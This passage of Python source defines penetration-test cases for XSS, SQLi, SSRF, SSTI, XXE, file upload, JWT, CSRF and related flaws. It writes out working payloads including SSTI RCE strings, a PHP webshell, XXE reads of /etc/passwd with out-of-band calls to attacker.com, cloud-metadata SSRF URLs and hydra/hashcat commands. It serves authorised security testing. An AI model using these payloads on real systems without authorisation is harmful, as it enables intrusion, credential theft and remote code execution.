        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["spring", "actuator", "exposure"]},
        "applicable_to": ["web", "network"], "tags": ["spring", "actuator", "exposure", "rce"],
    },
    {
        "id": "TC-N017", "title": "RDP / SSH Brute Force",
        "category": "Infrastructure", "severity": "high",
        "description": "Remote access services exposed to the internet with weak credentials are brute-forced for initial access.",
        "attack_pattern": "Test common credentials against exposed SSH and RDP services.",
        "steps": [
            "Identify exposed services: nmap -p 22,3389,5900,5901 <target>",
            "SSH brute-force: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target",
            "Test common credentials: root/root, admin/admin, ubuntu/ubuntu, pi/raspberry",
            "Test if RSA key auth required or password auth still enabled",
            "RDP: Test for Bluekeep (CVE-2019-0708): nmap --script rdp-vuln-ms12-020 -p 3389",
        ],
        "expected_result": "SSH key-only authentication. MFA on RDP. Fail2ban / CrowdSec active. Services not exposed to internet.",
        "cwe": "CWE-307", "owasp": "A07:2021",
        "tools": {"nmap": ["-p 22,3389", "--script ssh-brute"]},
        "applicable_to": ["network"], "tags": ["brute-force", "ssh", "rdp", "network"],
    },
    {
        "id": "TC-N018", "title": "memcached / Elasticsearch Unauthenticated Access",
        "category": "Infrastructure", "severity": "critical",
        "description": "memcached (port 11211) and Elasticsearch (port 9200) exposed without authentication allow reading all cached data and search indices respectively.",
        "attack_pattern": "Connect to exposed data store ports without credentials.",
        "steps": [
            "Scan: nmap -p 9200,9300,11211 <target>",
            "Elasticsearch: curl http://<target>:9200/ — check if version returned unauthenticated",
            "ES dump: curl http://<target>:9200/_cat/indices?v — list all indices",
            "ES data: curl http://<target>:9200/<index>/_search?size=100&pretty",
            "memcached: echo 'stats' | nc -q1 <target> 11211 — dump all keys",
        ],
        "expected_result": "Elasticsearch requires authentication (X-Pack). memcached firewalled. Never exposed to internet.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nmap": ["-p 9200,11211"]},
        "applicable_to": ["network", "cloud"], "tags": ["elasticsearch", "memcached", "exposure", "critical"],
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# Pattern-derived test cases  (built from attack_patterns.py — 5700+ patterns)
# These are richer and more payload-specific than the base library above.
# Deduplication happens in _filter_test_cases before returning to callers.
# ─────────────────────────────────────────────────────────────────────────────

def _fmt_payloads(items: list, n: int = 6) -> list[str]:
    return [f"Payload: {p}" for p in items[:n]]


def _ssrf_flat(n: int = 6) -> list[str]:
    urls = [u for u, _ in SSRF_TARGETS][:n]
    return [f"Target: {u}" for u in urls]


PATTERN_TEST_CASES: list[dict] = [

    # ── XSS ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-XSS01",
        "title": "Reflected XSS — Pattern Library (36 payloads)",
        "category": "Web Application",
        "severity": "high",
        "description": (
            "Test all user-controlled parameters for reflected XSS using a curated set of payloads "
            "covering HTML injection, event handler bypass, SVG, polyglot, and WAF evasion vectors. "
            f"Commonly vulnerable params: {', '.join(XSS_TEST_PARAMS[:8])}."
        ),
        "attack_pattern": "Inject payloads into query params, form fields, headers, and JSON fields. "
                          "Look for unescaped output in HTML response.",
        "steps": [
            f"Target params: {', '.join(XSS_TEST_PARAMS)}",
            *_fmt_payloads(XSS_PAYLOADS, 8),
            "Check if output appears unescaped in: body, attribute, JS context, or URL",
            "For JSON APIs: inject into string values, check if response is rendered in a browser",
            "Escalate: steal cookies, exfiltrate localStorage, trigger requests to attacker domain",
        ],
        "expected_result": "All special chars (< > \" ' `) are HTML-encoded or rejected.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "reflected"]},
        "applicable_to": ["web", "api"],
        "tags": ["xss", "injection", "client-side"],
    },
    {
        "id": "TC-PAT-XSS02",
        "title": "DOM-Based XSS — Sink & Source Pattern Coverage",
        "category": "Web Application",
        "severity": "high",
        "description": (
            "DOM XSS occurs when JavaScript writes attacker-controlled data to dangerous sinks "
            f"(innerHTML, eval, document.write). High-risk params: {', '.join(DOM_XSS_SINK_PARAMS[:8])}."
        ),
        "attack_pattern": "Inject into URL fragments (#) and query params that JS reads without server round-trip.",
        "steps": [
            f"Sink params: {', '.join(DOM_XSS_SINK_PARAMS)}",
            *_fmt_payloads(DOM_XSS_PAYLOADS, 6),
            "Search JS source for: innerHTML, outerHTML, document.write, eval, location.href =",
            "Inject into #fragment — check if content is written to DOM without sanitisation",
            "Use browser DevTools → Sources → search JS for dangerous sinks",
        ],
        "expected_result": "No user-controlled data reaches DOM sinks without sanitisation.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "dom"]},
        "applicable_to": ["web"],
        "tags": ["xss", "dom", "client-side"],
    },

    # ── SQLi ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-SQLI01",
        "title": "SQL Injection — Error-Based Detection (Pattern Library)",
        "category": "Web Application",
        "severity": "critical",
        "description": (
            f"Probe {len(SQLI_TEST_PARAMS)} common DB-facing params with error-triggering payloads. "
            f"Error signatures checked: {', '.join(SQLI_ERROR_PATTERNS[:4])}…"
        ),
        "attack_pattern": "Submit malformed SQL syntax and detect DB error messages in response.",
        "steps": [
            f"Target params: {', '.join(SQLI_TEST_PARAMS)}",
            *_fmt_payloads(SQLI_ERROR_PAYLOADS, 8),
            f"Confirm error: look for patterns — {', '.join(SQLI_ERROR_PATTERNS[:3])}",
            "Use sqlmap: sqlmap -u 'URL?param=1' --batch --level 3",
            "Enumerate: sqlmap -u URL -p param --dbs --tables",
        ],
        "expected_result": "No SQL errors in response. All DB queries use parameterised statements.",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["sqli", "sqli-error"], "ffuf_wordlist": ""},
        "applicable_to": ["web", "api"],
        "tags": ["sqli", "injection", "critical"],
    },
    {
        "id": "TC-PAT-SQLI02",
        "title": "Blind SQL Injection — Time-Based Detection",
        "category": "Web Application",
        "severity": "critical",
        "description": "When error messages are suppressed, time-based payloads confirm injection by observing response delays.",
        "attack_pattern": "Inject time-delay payloads; compare response time with and without payload.",
        "steps": [
            *_fmt_payloads(SQLI_TIME_PAYLOADS, 6),
            "Baseline: note normal response time",
            "Inject sleep payload — if response takes 5+ s, SQLi confirmed",
            "MySQL: 1' AND SLEEP(5)--  |  MSSQL: 1'; WAITFOR DELAY '0:0:5'--",
            "PostgreSQL: 1'; SELECT pg_sleep(5)--  |  Oracle: 1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "Automate with sqlmap: sqlmap -u URL -p param --technique=T --time-sec=5",
        ],
        "expected_result": "No response time difference. Prepared statements prevent time-based injection.",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["sqli", "blind-sqli"]},
        "applicable_to": ["web", "api"],
        "tags": ["sqli", "blind", "time-based", "injection"],
    },

    # ── SSRF ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-SSRF01",
        "title": "SSRF — Internal Service Probe with Bypass Encodings",
        "category": "Web Application",
        "severity": "critical",
        "description": (
            f"Test {len(SSRF_PARAMS)} SSRF-prone params against cloud metadata, internal addresses, "
            f"and {len(SSRF_BYPASS_ENCODINGS)} bypass encodings."
        ),
        "attack_pattern": "Supply server-side URL params pointing to cloud metadata and internal hosts.",
        "steps": [
            f"Target params: {', '.join(SSRF_PARAMS[:12])}",
            *_ssrf_flat(6),
            f"Bypass encodings: {', '.join(SSRF_BYPASS_ENCODINGS[:4])}",
            "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
            "Use Burp Collaborator / interactsh to detect blind SSRF via DNS callback",
        ],
        "expected_result": "Server must block outbound requests to internal ranges and cloud metadata IPs.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf"]},
        "applicable_to": ["web", "api"],
        "tags": ["ssrf", "injection", "cloud"],
    },

    # ── IDOR ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-IDOR01",
        "title": "IDOR — Object Reference Enumeration (Pattern Library)",
        "category": "Web Application",
        "severity": "high",
        "description": (
            f"Test {len(IDOR_ID_PARAMS)} identity params and {len(IDOR_REST_PATHS)} REST patterns "
            "for insecure direct object references."
        ),
        "attack_pattern": "Replace resource IDs with neighbouring values; access as different user.",
        "steps": [
            f"High-risk params: {', '.join(IDOR_ID_PARAMS[:12])}",
            f"REST path patterns: {', '.join(IDOR_REST_PATHS[:6])}",
            "Step 1: Authenticate as User A, note your resource ID (e.g. /users/1001/profile)",
            "Step 2: Authenticate as User B, send User A's resource ID — should get 403",
            "Step 3: Try sequential IDs: 1000, 999, 1002",
            "Step 4: Try GUIDs from other users observed in JS/API responses",
            "Step 5: Verify IDOR in POST/PUT too — not just GET",
        ],
        "expected_result": "Object-level authorisation check passes for every resource access.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["idor"]},
        "applicable_to": ["web", "api"],
        "tags": ["idor", "access-control", "bola"],
    },

    # ── Open Redirect ─────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-REDIR01",
        "title": "Open Redirect — 20-Variant Payload Coverage",
        "category": "Web Application",
        "severity": "medium",
        "description": (
            f"Test {len(REDIRECT_PARAMS)} redirect params with {len(REDIRECT_PAYLOADS)} bypass variants "
            "including schema confusion, path traversal, and URL encoding tricks."
        ),
        "attack_pattern": "Supply attacker-controlled URLs in redirect params to send victims off-domain.",
        "steps": [
            f"Target params: {', '.join(REDIRECT_PARAMS[:8])}",
            *_fmt_payloads(REDIRECT_PAYLOADS[:8]),
            "Check Location header after login/logout flow — does it redirect to attacker.com?",
            "Test: //attacker.com  /\\attacker.com  https:attacker.com",
            "Combine with XSS: ?next=javascript:alert(1)",
            "Use for phishing: redirect after valid login to attacker landing page",
        ],
        "expected_result": "Redirect destinations validated against an allowlist of trusted domains.",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["redirect"]},
        "applicable_to": ["web", "api"],
        "tags": ["redirect", "phishing"],
    },

    # ── SSTI ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-SSTI01",
        "title": "SSTI — Template Engine RCE Probe",
        "category": "Advanced Injection",
        "severity": "critical",
        "description": (
            f"Probe {len(SSTI_TEST_FIELDS)} template-related params with {len(SSTI_PAYLOADS)} engine-specific payloads. "
            "Covers Jinja2, Twig, FreeMarker, Pebble, Velocity."
        ),
        "attack_pattern": "Submit template syntax — if the engine evaluates it, escalate to RCE.",
        "steps": [
            f"Target fields: {', '.join(SSTI_TEST_FIELDS[:8])}",
            *_fmt_payloads(SSTI_PAYLOADS, 8),
            "Confirm: {{7*7}} → 49 (Jinja2/Twig)  |  ${7*7} → 49 (FreeMarker)",
            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ],
        "expected_result": "Template expressions are not evaluated. Sandbox escapes return errors.",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ssti"]},
        "applicable_to": ["web", "api"],
        "tags": ["ssti", "rce", "injection"],
    },

    # ── NoSQL ─────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-NOSQL01",
        "title": "NoSQL Injection — MongoDB Operator Bypass",
        "category": "Advanced Injection",
        "severity": "high",
        "description": (
            f"Inject MongoDB operators ($gt, $ne, $regex, $where) using {len(NOSQL_INJECTION_PAYLOADS)} "
            f"body payloads and {len(NOSQL_URL_PAYLOADS)} URL-encoded variants."
        ),
        "attack_pattern": "Replace parameter values with MongoDB operator objects to bypass authentication or dump collections.",
        "steps": [
            *_fmt_payloads(NOSQL_INJECTION_PAYLOADS, 6),
            *_fmt_payloads(NOSQL_SLEEP_PAYLOADS[:2]),
            "Login bypass: POST {\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
            "Wildcard match: ?search[$regex]=.*  or  ?search[$ne]=invalid",
            "Blind: inject $where with sleep() to confirm via response delay",
            "Tool: nosqli -u 'URL' -p param --attack auth",
        ],
        "expected_result": "MongoDB query input is validated; operators are not accepted as parameter values.",
        "cwe": "CWE-943", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["nosqli"]},
        "applicable_to": ["web", "api"],
        "tags": ["nosqli", "mongodb", "injection"],
    },

    # ── XXE ───────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-XXE01",
        "title": "XXE — External Entity Injection (Full Payload Set)",
        "category": "Web Application",
        "severity": "critical",
        "description": (
            f"Test XML-accepting endpoints with {len(XXE_PAYLOADS)} XXE payloads covering "
            "file read, SSRF, blind OOB exfiltration, and DTD-based attacks."
        ),
        "attack_pattern": "Define external entity pointing to sensitive file or internal URL; observe if included in response.",
        "steps": [
            "Identify XML-accepting endpoints (Content-Type: application/xml, text/xml, multipart/form-data with XML parts)",
            "File read: <!DOCTYPE x[<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
            "SSRF: <!DOCTYPE x[<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]><x>&xxe;</x>",
            "Blind OOB: <!DOCTYPE x[<!ENTITY % xxe SYSTEM 'http://attacker.com/'>%xxe;]>",
            *_fmt_payloads(XXE_PAYLOADS[:4]),
            "Also test SVG upload, DOCX/XLSX file processing, SAML requests — all carry XML",
        ],
        "expected_result": "XML parser has external entities disabled (FEATURE_SECURE_PROCESSING = true).",
        "cwe": "CWE-611", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["xxe"]},
        "applicable_to": ["web", "api"],
        "tags": ["xxe", "injection", "oob"],
    },

    # ── File Upload ───────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-UPLOAD01",
        "title": "File Upload — Extension Bypass & RCE",
        "category": "File Upload",
        "severity": "critical",
        "description": (
            f"Attempt unrestricted code upload using {len(FILE_UPLOAD_BYPASS_EXTENSIONS)} extension bypass variants. "
            f"Common upload paths probed: {', '.join(FILE_UPLOAD_PATHS[:4])}."
        ),
        "attack_pattern": "Upload webshell using extension bypass; access the file via direct URL to trigger RCE.",
        "steps": [
            f"Bypass extensions: {', '.join(FILE_UPLOAD_BYPASS_EXTENSIONS[:10])}",
            "Upload: <?php system($_GET['cmd']); ?> as shell.php",
            "If .php blocked: try shell.PHP, shell.php5, shell.phtml, shell.php%00.jpg",
            "Change Content-Type to image/jpeg while keeping .php extension",
            f"Probe upload paths: {', '.join(FILE_UPLOAD_PATHS[:6])}",
            "Path traversal in filename: ../../webroot/shell.php",
            "After upload, request the file directly and append ?cmd=id",
        ],
        "expected_result": "Only allow-listed content types accepted. Uploaded files not served as executable.",
        "cwe": "CWE-434", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["file-upload", "rce"]},
        "applicable_to": ["web"],
        "tags": ["file-upload", "rce", "critical"],
    },

    # ── Sensitive Paths ───────────────────────────────────────────────────────
    {
        "id": "TC-PAT-DISC01",
        "title": "Information Disclosure — Sensitive Path Probe",
        "category": "Information Disclosure",
        "severity": "high",
        "description": (
            f"Probe {len(COMMON_SENSITIVE_PATHS) + len(INFO_DISCLOSURE_PATHS)} known paths for "
            "exposed configs, source, credentials, and debug endpoints."
        ),
        "attack_pattern": "GET request to known sensitive paths; check for 200 responses with secrets.",
        "steps": [
            f"Config paths: {', '.join(COMMON_SENSITIVE_PATHS[:8])}",
            f"Debug/admin paths: {', '.join(INFO_DISCLOSURE_PATHS[:8])}",
            f"Monitoring paths: {', '.join(p for p, _ in MONITORING_PATHS[:6])}",
            "ffuf -u TARGET/FUZZ -w wordlist.txt -mc 200,301,302 -t 40",
            "Check .env — look for DB passwords, API keys, SECRET_KEY",
            "Check /actuator/env, /actuator/heapdump for Spring Boot apps",
        ],
        "expected_result": "Sensitive paths return 403/404. No credentials or internal data exposed.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "misconfig", "config"], "ffuf_wordlist": "common.txt"},
        "applicable_to": ["web", "api"],
        "tags": ["exposure", "recon", "config"],
    },

    # ── Privilege Escalation ──────────────────────────────────────────────────
    {
        "id": "TC-PAT-PRIVESC01",
        "title": "Privilege Escalation — Role Param Injection & Admin Path Access",
        "category": "Authentication",
        "severity": "critical",
        "description": (
            f"Test {len(PRIV_ESC_PARAMS)} privilege-related params and {len(PRIV_ESC_ADMIN_PATHS)} "
            "admin paths for horizontal/vertical privilege escalation."
        ),
        "attack_pattern": "Inject role/permission fields in requests; access admin paths as low-privilege user.",
        "steps": [
            f"Privilege params: {', '.join(list(p.keys())[0] + '=' + str(list(p.values())[0]) for p in PRIV_ESC_PARAMS[:10])}",
            f"Admin paths: {', '.join(PRIV_ESC_ADMIN_PATHS[:8])}",
            "Add role=admin or isAdmin=true to request body",
            "Access admin paths authenticated as regular user — check for 200 vs 403",
            "Try path bypass: /admin/../user/../admin  or  /user/../../admin",
            "Add headers: X-Original-URL: /admin  X-Forwarded-For: 127.0.0.1",
        ],
        "expected_result": "Role checks are server-side. Admin paths return 403 for non-admin users.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["priv-esc", "admin-panel"]},
        "applicable_to": ["web", "api"],
        "tags": ["privesc", "access-control", "admin"],
    },

    # ── Mass Assignment ───────────────────────────────────────────────────────
    {
        "id": "TC-PAT-MASS01",
        "title": "Mass Assignment — Unauthorised Field Binding",
        "category": "Web Application",
        "severity": "high",
        "description": (
            f"Inject {len(MASS_ASSIGNMENT_ROLE_FIELDS)} privilege-escalating fields into JSON "
            "bodies to test for mass assignment vulnerabilities."
        ),
        "attack_pattern": "Add extra fields to JSON PUT/PATCH requests; observe if server accepts and persists them.",
        "steps": [
            f"Privileged fields to inject: {', '.join(list(f.keys())[0] + '=' + str(list(f.values())[0]) for f in MASS_ASSIGNMENT_ROLE_FIELDS[:10])}",
            'Add {"role": "admin"} to existing update request body',
            'Try: {"is_admin": true, "verified": true, "subscription_tier": "enterprise"}',
            "Check /api-docs or /swagger for undocumented internal fields",
            "Observe response — does it echo back injected fields?",
            "Re-fetch your profile — did privilege change persist?",
        ],
        "expected_result": "Framework allowlists accepted fields. Privileged fields cannot be set by end-users.",
        "cwe": "CWE-915", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["mass-assignment"]},
        "applicable_to": ["api"],
        "tags": ["mass-assignment", "access-control"],
    },

    # ── Account Takeover ──────────────────────────────────────────────────────
    {
        "id": "TC-PAT-ATO01",
        "title": "Account Takeover — Password Reset Flow Attacks",
        "category": "Authentication",
        "severity": "critical",
        "description": (
            f"Test {len(ATO_PASSWORD_RESET_TESTS)} known ATO vectors: Host header injection, "
            f"parameter pollution, token reuse. Reset endpoints: {', '.join(ATO_RESET_ENDPOINTS[:4])}."
        ),
        "attack_pattern": "Manipulate password reset flow to receive reset link at attacker-controlled address.",
        "steps": [
            *[f"Inject header: {list(t.keys())[0]}: {list(t.values())[0]}" for t in ATO_PASSWORD_RESET_TESTS[:8]],
            f"Reset endpoints to test: {', '.join(ATO_RESET_ENDPOINTS)}",
            "Host header injection: change Host: to attacker.com during reset — check link domain",
            "Parameter pollution: send email=victim@x.com&email=attacker@x.com",
            "Try reusing expired reset tokens — check if server invalidates after first use",
        ],
        "expected_result": "Reset link domain is hardcoded server-side. Tokens expire after first use.",
        "cwe": "CWE-640", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["account-takeover", "password-reset"]},
        "applicable_to": ["web", "api"],
        "tags": ["ato", "account-takeover", "password-reset"],
    },

    # ── Weak Credentials ──────────────────────────────────────────────────────
    {
        "id": "TC-PAT-CRED01",
        "title": "Weak / Default Credentials — Bug Bounty Credential Pairs",
        "category": "Authentication",
        "severity": "critical",
        "description": (
            f"Test {len(WEAK_CREDENTIAL_PAIRS)} real-world default and commonly reused credential "
            "pairs from bug bounty reports."
        ),
        "attack_pattern": "Attempt login with default and commonly leaked credential pairs.",
        "steps": [
            *[f"Try: {u} / {p}" for u, p in WEAK_CREDENTIAL_PAIRS[:10]],
            "Run hydra: hydra -C credentials.txt ssh://target",
            "Test admin panels, staging environments, internal tools",
            "Check for default credentials in technology-specific docs (Jenkins, Grafana, etc.)",
            "Verify rate limiting is active after N failures",
        ],
        "expected_result": "All default passwords changed. Rate limiting and lockout active on login.",
        "cwe": "CWE-798", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["default-login"]},
        "applicable_to": ["web", "network"],
        "tags": ["credentials", "brute-force", "default-login"],
    },

    # ── JWT ───────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-JWT01",
        "title": "JWT — alg:none, Weak Secret, KID Injection",
        "category": "Authentication",
        "severity": "high",
        "description": (
            f"Test JWTs with {len(JWT_ALG_NONE_VARIANTS)} alg:none variants, "
            f"{len(JWT_WEAK_SECRETS)} weak HMAC secrets, and {len(JWT_KID_PAYLOADS)} kid injection payloads."
        ),
        "attack_pattern": "Forge JWT with algorithm downgrade or cracked secret to impersonate higher-privilege user.",
        "steps": [
            f"alg:none variants: {', '.join(JWT_ALG_NONE_VARIANTS)}",
            f"Weak secrets: {', '.join(JWT_WEAK_SECRETS[:8])}",
            f"KID payloads: {', '.join(JWT_KID_PAYLOADS[:4])}",
            "1. Decode JWT at jwt.io — inspect header.alg and payload claims",
            "2. Set alg to none, strip signature — does server accept it?",
            "3. hashcat -a 0 -m 16500 token.txt rockyou.txt — crack HMAC secret",
            "4. Modify sub/role claim, re-sign with cracked secret",
            "5. RS256→HS256: sign with server's public key as HMAC secret",
        ],
        "expected_result": "alg:none rejected. Weak secrets not used. kid parameter sanitised.",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["jwt"]},
        "applicable_to": ["web", "api"],
        "tags": ["jwt", "auth", "crypto"],
    },

    # ── CSRF ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-CSRF01",
        "title": "CSRF — State-Changing Actions & Header Bypass Vectors",
        "category": "Web Application",
        "severity": "medium",
        "description": (
            f"Test {len(CSRF_SENSITIVE_ACTIONS)} sensitive state-changing actions for CSRF protection gaps. "
            f"Includes {len(CSRF_BYPASS_HEADERS)} known bypass header vectors."
        ),
        "attack_pattern": "Build cross-origin form/fetch targeting state-changing endpoints; verify request fires without CSRF token.",
        "steps": [
            f"Sensitive actions: {', '.join(CSRF_SENSITIVE_ACTIONS[:8])}",
            f"Bypass headers to try: {', '.join(list(CSRF_BYPASS_HEADERS.keys())[:6])}",
            "Build HTML form on evil.com pointing to target state-changing URL",
            "Submit form while victim is authenticated — did action execute?",
            "Check SameSite cookie attribute: Lax/Strict blocks most CSRF",
            "For JSON APIs: try Content-Type: text/plain with JSON body",
            "Try removing Origin/Referer header — does server still accept?",
        ],
        "expected_result": "CSRF tokens on all state-changing forms. SameSite=Strict or Lax on session cookies.",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["csrf"]},
        "applicable_to": ["web"],
        "tags": ["csrf", "client-side"],
    },

    # ── Prototype Pollution ───────────────────────────────────────────────────
    {
        "id": "TC-PAT-PROTO01",
        "title": "Prototype Pollution — Object Merge / Deep Clone Attacks",
        "category": "Advanced Injection",
        "severity": "high",
        "description": (
            f"Test {len(PROTOTYPE_POLLUTION_PAYLOADS)} prototype pollution payloads in JSON request bodies "
            "and query strings targeting JS-based backends and frontend libraries."
        ),
        "attack_pattern": "Inject __proto__ or constructor.prototype fields to pollute the Object prototype and alter application behaviour.",
        "steps": [
            *[f"Payload: {json.dumps(p)}" for p in PROTOTYPE_POLLUTION_PAYLOADS[:6]],
            'POST body: {"__proto__":{"isAdmin":true}}',
            'Query: ?__proto__[isAdmin]=true  or  ?constructor[prototype][isAdmin]=true',
            "Check if subsequent requests return elevated privileges",
            "Tool: ppmap -u 'https://target.com' to scan for prototype pollution",
            "For client-side: check jQuery.extend, lodash.merge, hoek.merge with polluted input",
        ],
        "expected_result": "Merge/clone functions sanitise __proto__ and constructor keys.",
        "cwe": "CWE-1321", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["prototype-pollution"]},
        "applicable_to": ["web", "api"],
        "tags": ["prototype-pollution", "javascript", "injection"],
    },

    # ── Business Logic ────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-BL01",
        "title": "Business Logic — Price / Quantity / Coupon Manipulation",
        "category": "Business Logic",
        "severity": "high",
        "description": (
            f"Execute {len(BUSINESS_LOGIC_TESTS)} business logic test cases including negative quantity, "
            f"price override, coupon stacking, and race conditions. "
            f"Known valid coupon codes to abuse: {', '.join(COUPON_CODES[:5])}."
        ),
        "attack_pattern": "Manipulate financial parameters client-side; attempt to purchase items at zero or negative cost.",
        "steps": [
            *[f"Test field={t['field']} with value={t['value']}" for t in BUSINESS_LOGIC_TESTS[:6]],
            "Set quantity=-1 and checkout — check if balance increases",
            "Set price=0.01 in request body — check if server recalculates server-side",
            f"Try coupon codes: {', '.join(COUPON_CODES[:6])}",
            "Apply same coupon twice in rapid succession (race condition)",
            f"Basket attacks: {', '.join(json.dumps(a) for a in BUSINESS_LOGIC_BASKET_ATTACKS[:3])}",
        ],
        "expected_result": "All pricing and business rule enforcement is server-side. Coupons validated once.",
        "cwe": "CWE-840", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"],
        "tags": ["business-logic", "payments", "logic-flaw"],
    },

    # ── GraphQL ───────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-GQL01",
        "title": "GraphQL — Introspection, Auth Bypass & Batching Attacks",
        "category": "API Security",
        "severity": "high",
        "description": (
            f"Test {len(GRAPHQL_PATHS)} GraphQL endpoints for enabled introspection, "
            f"auth bypass via query manipulation, and {len(GRAPHQL_AUTH_BYPASS_QUERIES)} known bypass queries."
        ),
        "attack_pattern": "Use introspection to map schema, then craft queries to access unauthorised data.",
        "steps": [
            f"Common paths: {', '.join(GRAPHQL_PATHS)}",
            f"Introspection query: {GRAPHQL_INTROSPECTION}",
            *[f"Auth bypass: {q[:80]}…" for q in GRAPHQL_AUTH_BYPASS_QUERIES[:3]],
            "Check if introspection is disabled in production (should be)",
            "Test field-level auth: query fields from other users' objects",
            "Batching attack: send 1000 login mutations in one request to bypass rate limits",
            "Alias attack: alias same field 100x to amplify response cost",
        ],
        "expected_result": "Introspection disabled in prod. Per-field and per-object auth enforced. Batching rate-limited.",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["graphql"]},
        "applicable_to": ["api"],
        "tags": ["graphql", "api", "introspection"],
    },

    # ── Cache Poisoning ───────────────────────────────────────────────────────
    {
        "id": "TC-PAT-CACHE01",
        "title": "Web Cache Poisoning — Unkeyed Header Injection",
        "category": "Web Application",
        "severity": "high",
        "description": (
            f"Test {len(CACHE_POISON_HEADERS)} unkeyed headers with {len(CACHE_POISON_VALUES)} "
            "poisoning values to inject malicious content into cached responses."
        ),
        "attack_pattern": "Supply unkeyed request headers that alter the response; if cached, serve malicious content to all users.",
        "steps": [
            f"Headers to test: {', '.join(CACHE_POISON_HEADERS[:8])}",
            f"Payloads: {', '.join(CACHE_POISON_VALUES[:4])}",
            "Add X-Forwarded-Host: attacker.com — check if response reflects in JS src/href",
            "If reflected, wait for cache; request without the header — is attacker.com still there?",
            "Check for Cache-Control headers — cacheable 200s are highest risk",
            "Tool: param-miner (Burp extension) to detect unkeyed parameters",
        ],
        "expected_result": "All cache-varying headers are keyed. Unkeyed headers don't affect response content.",
        "cwe": "CWE-444", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cache-poisoning"]},
        "applicable_to": ["web"],
        "tags": ["cache-poisoning", "headers"],
    },

    # ── Race Conditions ───────────────────────────────────────────────────────
    {
        "id": "TC-PAT-RACE01",
        "title": "Race Conditions — Concurrent Request Exploitation",
        "category": "Business Logic",
        "severity": "high",
        "description": (
            f"Test {len(RACE_CONDITION_ENDPOINTS)} race-condition-prone endpoint patterns "
            "by sending simultaneous requests to exploit TOCTOU gaps."
        ),
        "attack_pattern": "Send 20-50 concurrent identical requests to bypass one-time-use restrictions.",
        "steps": [
            f"High-risk endpoints: {', '.join(RACE_CONDITION_ENDPOINTS[:8])}",
            "Use Burp Turbo Intruder: send 20 concurrent POST requests to coupon/redeem",
            "Python: asyncio + aiohttp to send simultaneous requests",
            "Test: single-use coupons, one-time OTPs, gift card redemption, vote/like endpoints",
            "Check if balance/stock updates use atomic DB operations or application-level locks",
            "Timing attack: use Last-Byte Sync in Turbo Intruder for precise race windows",
        ],
        "expected_result": "Database transactions use atomic operations. Idempotency keys prevent double-processing.",
        "cwe": "CWE-362", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"],
        "tags": ["race-condition", "toctou", "business-logic"],
    },

    # ── CORS ──────────────────────────────────────────────────────────────────
    {
        "id": "TC-PAT-CORS01",
        "title": "CORS Misconfiguration — Origin Reflection & Credential Exposure",
        "category": "Web Application",
        "severity": "high",
        "description": (
            f"Test {len(CORS_SENSITIVE_PATHS)} sensitive API paths with {len(CORS_ATTACK_ORIGINS)} "
            "origin bypass variants to detect CORS misconfigurations that allow cross-origin credential theft."
        ),
        "attack_pattern": "Supply arbitrary Origin headers; check if reflected in Access-Control-Allow-Origin with credentials.",
        "steps": [
            f"Test origins: {', '.join(CORS_ATTACK_ORIGINS[:6])}",
            f"Sensitive paths: {', '.join(CORS_SENSITIVE_PATHS[:6])}",
            "Send: Origin: https://attacker.com — check ACAO response header",
            "If ACAO=attacker.com AND ACAC=true, exploit is trivial (XHR with credentials)",
